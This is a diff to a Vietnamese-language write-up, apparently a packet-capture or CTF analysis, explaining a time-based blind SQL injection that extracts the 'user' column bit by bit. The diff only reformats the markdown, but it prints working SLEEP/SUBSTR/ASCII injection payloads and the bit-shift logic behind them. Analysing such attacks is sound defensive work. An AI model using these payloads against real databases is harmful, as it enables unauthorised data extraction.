@@ -15,16 +15,15 @@ group_concat(database_name) lấy tất cả record của Field database_name t�
 	- substr(string,1,1) : lấy kí tự thứ 1 của string,ở đây attacker tăng dần index lên để dò vị trí các kí tự
 	vd:  string =  'admin' => substr(string,1,1) = a, substr(string,2,1) = d ... 
 	- ASCII (char): chuyển kí tự sang mã ASCII
-	- ![ascii](ASCII.png)
+	![ascii](ASCII.png)
 	- ">> 7 & 1" đoạn này shift right 7, xong rồi and với 1
 	- Nếu kết quả trả về từ substr() là NUL thì sẽ trả về ASCII(NUL) = 0, do đó 0 >> 7 = 0; 0 & 1 = 0
 	- Mình lấy 3 gói tin delay khoảng 3 (s), attacker dùng để bruteforce chữ 'a' trong column user:
-	- ```mysql
+	```mysql
 			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 6 & 1) * 3)
 			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 5 & 1) * 3)
 			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 0 & 1) * 3)
-	  ```
-	-
+	```
 		97 >> 6  & 1 == 1 ==> SLEEP(3)
 		97 >> 5  & 1 == 1 ==> SLEEP(3)
 		97 >> 0  & 1 == 1 ==> SLEEP(3)
